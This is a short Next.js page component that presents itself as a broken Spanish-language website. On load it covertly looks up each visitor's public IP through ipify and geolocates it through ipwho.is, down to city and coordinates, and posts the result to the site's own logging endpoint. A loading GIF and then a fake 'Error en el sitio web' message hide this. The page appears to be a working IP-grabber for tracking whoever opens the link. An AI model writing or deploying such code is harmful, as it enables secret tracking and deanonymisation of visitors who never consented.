'use client';
import { useEffect, useState } from 'react';
import styles from "./page.module.css";

export default function Home() {
  const [showGif, setShowGif] = useState(true);

  useEffect(() => {
    async function logIPandLocation() {
      const ipRes = await fetch('https://api.ipify.org?format=json');
      const { ip } = await ipRes.json();

      const locationRes = await fetch(`https://ipwho.is/${ip}`);

      const locationData = await locationRes.json();

      const logData = {
        ip,
        location: {
          country: locationData.country,
          regionName: locationData.region,
          city: locationData.city,
          lat: locationData.latitude,
          lon: locationData.longitude,
        }
      };

      await fetch('/api/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(logData),
      });
    }

    logIPandLocation();

    const timer = setTimeout(() => {
      setShowGif(false);
    }, 2000);

    return () => clearTimeout(timer);
  }, []);

  return (
    <>
      <div className={styles.page}>
        <main className={styles.main}>
          {showGif ? (
            <img src="/holli-would-dancing.gif" alt="Cargando..." width="214" height="240" />
          ) : (
            <p>Error en el sitio web</p>
          )}
        </main>
      </div>
    </>
  );
}